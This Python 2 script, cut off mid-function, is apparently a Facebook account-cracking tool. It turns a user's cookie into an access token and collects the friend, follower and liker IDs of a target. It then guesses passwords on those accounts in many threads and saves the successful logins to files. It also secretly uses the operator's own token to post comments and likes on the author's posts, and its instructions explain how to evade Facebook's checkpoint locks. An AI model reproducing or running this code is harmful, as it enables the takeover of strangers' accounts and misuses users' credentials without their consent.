#coding=utf-8
import requests,bs4,sys,os,random,time,re,json
import calendar
#import jeeckxnano
from datetime import datetime
from datetime import date 
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding("utf-8")

I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
H='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
B='\033[0;36m'
B='\033[0;31m'
U='\033[0;35m'
k='\033[0;33m'
M='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
H='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
h='\033[00m'
p='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
b='\033[0;36m'
m='\033[0;31m'
u='\033[0;35m'
k='\033[0;33m'
c='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
H='\033[0;00m'
Q="\033[00m"
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def love_jeeck(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit() 
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

memek = ("""
                       `︿ˊ
    __    ____  ___________ _   __
   / /   / __ \/ ____//  _// | / /
  / /   / / / / / __  / / /  |/ /
 / /___/ /_/ / /_/ /_/ / / /|  /
/_____/\____/\____/____\/_/ |_/ V.1.00
""")
logo = ("""
\033[0;33m╭━━━━━━━╮
\033[0;33m┃● ══   ┃ \033[0;36m✠═╦══════╩═════════════════════════════════════════════✠
\033[0;33m┃███████┃   \033[0;36m║ \033[0;32m[1] \033[0;33mNc : Jecko Ramadhan  \033[0;36m║ \033[0;32m[\033[0;32m4] \033[0;33mX N C O D E
\033[0;33m┃█\033[0;00m>_\033[0;33m████┃   \033[0;36m║ \033[0;32m[2] \033[0;33mFB : Jeeck X Nano    \033[0;36m║ \033[0;32m[\033[0;32m5] \033[0;33mCRACK FBMBF
\033[0;33m┃███████┃   \033[0;36m║ \033[0;32m[3] \033[0;33mWA : 081392505882    \033[0;36m║ \033[0;32m[\033[0;32m6] \033[0;33mTHX : RISKY DUMAI
\033[0;33m┃███████| \033[0;36m✠═╬════════════════════════════════════════════════════✠
\033[0;33m┃███████┃   \033[0;36m╚═══•>   P R U D A L L A C C O U N T S O S M E D
\033[0;33m┃███████┃ \033[0;36m✠═╬════════════════════════════════════════════════════✠
\033[0;33m|○      ┃   \033[0;36m╚═══•> \033[0;33m   TOOLS CRACK FACEBOOK CODE BY : JEECK
\033[0;33m╰━━━━━━━╯   \033[0;36m╚═══•>   \033[0;33m CREATED BY : JEECK , DUMAI , YUMASAA\033[0;36m ╰_╯
""")

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")


subrek = random.choice(["https://www.facebook.com/jecko.ramadhan.9","https://www.facebook.com/jecko.ramadhan.9"])

youtuber = subrek



def login():
    global token
    os.system("clear");print(memek)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    print(" %s[%s1%s] Login via token\n%s [%s2%s] Bergabung Ke Group Fb"%(p,b,p,p,b,p))
    print(" %s[%s3%s] Cara Ambil Token"%(p,b,p))
    print(" %s[%s4%s] PANDUAN PENGGUNA"%(p,b,p))
    ___Jeeck___xnano___lawack___=raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if ___Jeeck___xnano___lawack___ in ["1","01"]:
        log_token()
    elif ___Jeeck___xnano___lawack___ in ["3","03"]:
        ___jeeck___cara()
    elif ___Jeeck___xnano___lawack___ in ["4","04"]:
        ___jeeck___cara___crack___()
    elif ___Jeeck___xnano___lawack___ in ["2","02"]:
        cookie()
    else:print("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p));time.sleep(1);login()


def log_token():
    global token
    os.system("clear");print(memek)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    convert=raw_input("%s [%s•%s] Token: "%(p,b,p))
    try:
        saya=requests.get('https://graph.facebook.com/me?access_token=%s'%(convert));open("login.txt",'w').write(convert)
        print("\n %s[%s•%s] Login berhasil"%(p,b,p));love_jeeck(" %s[%s•%s] Anjc Lu Pake doank Kagak Comment:)"%(p,b,p));os.system('xdg-open %s'%(youtuber))
        ___Jeeck___xnano___lawack__=raw_input(" [ ENTER ]")
        ___Jeeck___xnano___lawack___xnxx___()
        menu()
    except KeyError:
        print("\n %s[%s!%s] Token invalid!"%(p,m,p));time.sleep(1);login()


komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
kartu2d = random.choice(["pacaran kok sama 2D\nsampah bat lu bang","waduh sampah lu bang","wibu hengker tezy","judul anime apa bang?","bjir kawai cok","bang lapor gua habis coli","neper surentod","kentod berkentod :v"])
def ___Jeeck___xnano___lawack___xnxx___():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(_jeeckxnano.login())
    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '573457507083491'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + token)
 #   requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + token)
 #   requests.post('https://graph.facebook.com/' + post + '/reactions?type=likes&access_token=' + token)
#    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#kon zaim
 #   requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #mey
#  #  requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#mieruko chan
 #   requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #tsukasa chan
    

#komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep >
#k#omtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu B>
#ka#rtu2d = random.choice(["pacaran kok sama 2D\nsampah bat lu bang","waduh sampah lu bang","wibu hengker tezy","judul anime apa bang?","bjir kawai >
#def ___Jeeck___xnano___lawack___xnxx___():
 #   try:
  #      token = open('login.txt', 'r').read()
   # except IOError:
    #    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
     #   os.system('rm -rf login.txt')
#        exit(_jeeckxnano.login())
#    kom = komenredem
#    komentar = komtwol
 ##   yotsuba = kartu2d
  #  post = '572403750522200'
   # #requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    #requests.post('https://graph.facebook.com/572403750522200/comments/?message=' + kom + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/572403750522200/comments/?message=' + komentar + '&access_token=' + token)
#    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
 #   requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#kon zaim
  #  requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #mey
   # requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)#mieruko chan
    #requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token) #tsukasa chan
 #   exit(jeeck.menu())



def update():
    os.system(" xdg-open https://www.facebook.com/groups/221877543390653")
    menu()
def ___jeeck___cara():
   os.system(" xdg-open https://youtu.be/p4MjQCD0ej4 ")
   menu()
def ___jeeck___cara___crack___():
   love_jeeck(" %s[%s•%s] Follow Github Aink :( NGGAK MAKSA .·´¯`(>▂<)´¯`·. "%(p,b,p))
   love_jeeck(" %s[%s•%s] Kalian Siapkan Bahan Bahan 😁"%(p,b,p))
   love_jeeck(" %s[%s•%s] 🗿Bang Apa Bahan Bahan Nya :V"%(p,b,p))
   love_jeeck(" %s[%s•%s] : AKUN TUMBAL PROYEK,TOKEN,IDTARGET,USERAGENT, PAKETDATA"%(p,b,p))
   love_jeeck(" %s[%s•%s] Langsung Ae Tuh Cari Id Target Untuk Pengambilan Harus Bersifat"%(p,b,p))
   love_jeeck(" %s[%s•%s] Berteman Jika Tidak Berteman Tidak Masalah Lebih Baik Berteman Sihh......"%(p,b,p))
   love_jeeck(" %s[%s•%s] KaLo Mau Onetapss Yess Ya "%(p,b,p))
   love_jeeck(" %s[%s•%s] Untuk Pengambilan User Agent Cari Di Google Banyak Kok"%(p,b,p))
   love_jeeck(" %s[%s•%s] Ketikan User Agent Randomm "%(p,b,p))
   love_jeeck(" %s[%s•%s] Untuk Apn Pake APN BWAAN"%(p,b,p))
   love_jeeck(" %s[%s•%s] Bwank Apn Itu apa Apn Itu Untuk Sambung Internet"%(p,b,p))
   love_jeeck(" %s[%s•%s] Jadi Kalo Nggak Ada Apn Nggak Ada Internet / DOWN"%(p,b,p))
   love_jeeck(" %s[%s•%s] Cukup Kann.... Bocil..............EPEP"%(p,b,p))
   love_jeeck(" %s[%s•%s] Bwank :V....kanapa Jarang Up.... Lagi Mumet Aku Cok"%(p,b,p))
   love_jeeck(" %s[%s•%s] SEMOGA BETAH YAH PAKE TOOLS SAYA HEHEHEHEHEHE MAKASIH"%(p,b,p))
   love_jeeck(" %s[%s•%s] MAKASIH BUAT KALIAN YANG SUDAH SUPPORT SAYA SAMPE 27 FOLLOWERS"%(p,b,p))
   love_jeeck(" %s[%s•%s] I'M LOVE ALL "%(p,b,p))
   ___Jeeck___xnano___lawack__=raw_input("\n%s [%s•%s] ENTER Untuk Kembali Ke Menu Login "%(p,b,p))
   login()
def cookie():
	update()
	os.system('clear');print(logo)
	print("\033[0;96m"+50*"-")
	cookie = raw_input("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] cookie: ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	
	except requests.exceptions.ConnectionError:
		print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection")
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	print("\n %s[%s•%s] Login berhasil"%(p,b,p));love_jeeck(" %s[%s•%s] Please Subscribe My Channel:)"%(p,b,p));os.system('xdg-open %s'%(youtuber));exit(jeeckxnano.jeeckxnanodesu())
def menu():
    try:
        token = open("login.txt","r").read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s'%(token))
        i = json.loads(saya.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split("/")
        month = bulan_ttl[month]
    except Exception as e:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    os.system("clear");print(logo)
    print("✠═╦══════╩═════════════════════════════════════════════✠")
    print("%s [%s•%s] Nickname      : %s "%(p,b,p,nick));print("%s [%s•%s] ID facebook   : %s "%(p,b,p,idme));print("%s [%s•%s] Tanggal lahir : %s %s %s"%(p,b,p,day,month,year))
    print("\033[0;36m✠═╦══════╩═════════════════════════════════════════════✠")
    print("\n%s [%s01%s] Crack fb dari public "%(p,b,p))
    print("%s [%s02%s] Crack fb dari list perteman sendiri "%(p,b,p))
    print("%s [%s03%s] Crack fb dari follower publik "%(p,b,p))
    print("%s [%s04%s] Crack fb dari like publik"%(p,b,p))
    print("%s [%s05%s] Crack fb massal publik"%(p,b,p))
    print("%s [%s06%s] Chek opsi akun chek point"%(p,b,p))
    print("%s [%s07%s] Setting useragent"%(p,b,p))
    print("%s [%s08%s] Chek hasil crack"%(p,b,p))
    print("%s [%s09%s] Team project [ TEAM ]"%(p,b,p))
    print("%s [%s10%s] Repots Bug [ TUTOR SESI ]"%(p,b,p))
    print("%s [%s11%s] menu INSTAGRAM  \033[0;36m[ \033[0;33mNEW FITUR \033[0;36m]"%(p,b,p))
    print("%s [%s12%s] menu Crack PRO  \033[0;36m[ \033[0;33mNEW FITUR \033[0;36m]"%(p,b,p))
    print("%s [%s00%s] Logout dari akun ini"%(p,m,p))
    _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _jeeck_xxz_xnx_xuner_ in ["2","02"]:
        ___jeeck___dumptempik___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["1","01"]:
        ___jeeck___dumppupi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["10","10"]:
       ___jeeck___report___()
    elif _jeeck_xxz_xnx_xuner_ in ["9","09"]:
        ___jeeck___author___()
    elif _jeeck_xxz_xnx_xuner_ in ["3","03"]:
        ___jeeck___kotangpupi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["12","12"]:
        os.system("python SMBF.py")
    elif _jeeck_xxz_xnx_xuner_ in ["4","04"]:
        ___jeeck___kotangpupimambuwangi___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["5","05"]:
        ___jeeck___sunatmasall___()
        jeeck_X_nano_x()
    elif _jeeck_xxz_xnx_xuner_ in ["6","06"]:
        ___jeeck___opsinetiliki___()
    elif _jeeck_xxz_xnx_xuner_ in ["7","07"]:
        Berhasil()
    elif _jeeck_xxz_xnx_xuner_ in ["8","07"]:
        ___jeeck___tilikihasile___()
    elif _jeeck_xxz_xnx_xuner_ in ["11","11"]:
#        _jeeck_proo__instag()
 #       _jeeck_proo__instagg()
         os.system("python Brute.py")
#        _jeeck_proo_()
    elif _jeeck_xxz_xnx_xuner_ in ["0","00"]:
        os.system("rm -rf login.txt")
    else:print("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p));time.sleep(1);login()
def ___jeeck___author___():
   love_jeeck("\n %s[%s•%s] AUTHOR :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]          (1. Jeeck x Nano "%(p,b,p))
   love_jeeck(" %s[%s•%s] TEAM PROJECT :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (1. XNXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]              (2. XXCODE "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (3. RISKY  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              (4. YUMASAA "%(p,b,p))
   love_jeeck(" %s[%s•%s] DONASI : [ JEECK ] "%(p,b,p))
   love_jeeck(" %s[%s•%s]        : 08192505882 "%(p,b,p))
   love_jeeck(" %s[%s•%s]        : 085891511849"%(p,b,p)) 
   love_jeeck(" %s[%s•%s] THANKS TO : "%(p,b,p))
   love_jeeck(" %s[%s•%s]           : XNXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : XXCODE"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : RISKY"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : YUMASAA"%(p,b,p))
   love_jeeck(" %s[%s•%s]           : UDARA KARENA TANPA UDARA KITA AKAN MATI"%(p,b,p))
   _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] ENTER UNTUK KEMBALI KE MENU "%(p,b,p))
   menu()

def ___jeeck___report___():
   love_jeeck("\n %s[%s•%s] Repoth Bug :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Chat Wa Admin  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : ( 081392505882  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Facebook  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s]              : ( Jeeck X Nano  "%(p,b,p))
   love_jeeck(" %s[%s•%s]              : Donasi :  "%(p,b,p))
   love_jeeck(" %s[%s•%s]               : ( 081392505882  "%(p,b,p))
   love_jeeck(" %s[%s•%s]               : ( 085891511849  "%(p,b,p))
   love_jeeck(" %s[%s•%s] TUTOR ONE TAP : "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Lu Masuk Tools Ini Pake Apn Bawaan "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Ganti User Agent Yang Cocok Untuk HP Lu  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s] ( Terus Lu Cari Id Target Yang Sedaerah Dengan Lu "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Semisal Kalo Lu Tinggal Di Jawa Ya Lu Ambil Id Target Daerah Jawa  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Terus Lu Buka Fb Lite   "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Usahain Lu Pas Login Di Fb Lite Pake Metode Ganti Apn  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Kalo Belum Jebol Lu Ganti Sim Semial Lu Pas Crack Pake Sim2 Lu Ganti ke Sim 1  "%(p,b,p)) 
   love_jeeck(" %s[%s•%s] ( Login Ke Fb Lite Ganti Sim Belum Jebol...........?  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Login Akun Ke sesi Di google Chrome Ganti Sim"%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Masih Belum Jebol Ganti Url Login  "%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Login FB BIRU Kalo Belum Jebol ...............?"%(p,b,p))
   love_jeeck(" %s[%s•%s] ( Tunggu 7-10 Hari Akun Dah Kebukak Sendiri "%(p,b,p))
   _jeeck_xxz_xnx_xuner_ = raw_input("\n%s [%s•%s] ENTER UNTUK KEMBALI KE MENU "%(p,b,p))
   menu()

def ___jeeck___dumptempik___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    try:
        for i in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Mungkin Id bersifat private0'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))


def ___jeeck___dumppupi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Mungkin Id bersifat private'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))


def ___jeeck___kotangpupi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target: "%(p,b,p,b,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] User Id Target Eror'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Masukan Dengan Benar'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))

def ___jeeck___kotangpupimambuwangi___():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masuk id postingan\n [%s•%s] ID post target: "%(p,b,p,b,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/llikes/?limit=100000&access_token=%s"%(idt,token)).json()["data"]:
            jeeckxbrutal = i['id']
            jeeckxx = i["name"]
            id.append(jeeckxbrutal+'<=>'+jeeckxx)
    except KeyError:
        exit('\n%s [%s!%s] User Id Target Eror'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] Masukan Dengan Benar'%(p,m,p))
    else:
        print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))

def ___jeeck___sunatmasall___():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
	try:
		jeeck_total = int(raw_input("\n%s [%s•%s] Total Dump Id Masal :  "%(p,b,p)))
	except:jeeck_total=1
	for t in range(jeeck_total):
		t +=1
		idt=raw_input("\n%s [%s•%s] Masuk id target\n [%s•%s] ID target%s: "%(p,b,p,b,p,t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				jeeckxbrutal = i["id"]
				jeeckxx = i["name"]
				id.append(jeeckxbrutal+"<=>"+jeeckxx)
		except KeyError:
			exit('\n%s [%s!%s] Dump id eror babi '%(p,m,p))
	if (len(id)) == 0:
		exit('\n%s [%s!%s] Mungkin Id bersifat private0'%(p,m,p))
	else:
		print("\n%s [%s•%s] Total id ~~> %s"%(p,b,p,(len(id))))

def jeeck_X_nano_x():
	print("\n%s [%s Select methode crack %s]%s"%(b,p,b,p))
	print("%s [%s1%s] Method B-API(%sKenceng%s)"%(p,b,p,b,p))
	print("%s [%s2%s] Method MBASIC(%sRecomended%s)"%(p,b,p,b,p))
	print("%s [%s3%s] Method MOBILE ( %sLELET BET %s)\n"%(p,b,p,b,p))
	_xncode_jeeckxnano_ = raw_input("%s [%s•%s] Choose: "%(p,b,p))
	if _xncode_jeeckxnano_ in [""]:
		exit("\n%s [%s!%s] Pilihan tidak boleh kosong!"%(p,m,p))
	elif _xncode_jeeckxnano_ in ["1","01"]:
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall in ["d","D"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(api, uid, jeeck_X_nano)
			hasil()

	elif _xncode_jeeckxnano_ == "2":
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mbasic, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall == "d":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(mbasic, uid, jeeck_X_nano)
			hasil()

	elif _xncode_jeeckxnano_ == "3":
		jeeck_X_nano_X_brutall = raw_input("%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,b,p,p,b,p))
		if jeeck_X_nano_X_brutall in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
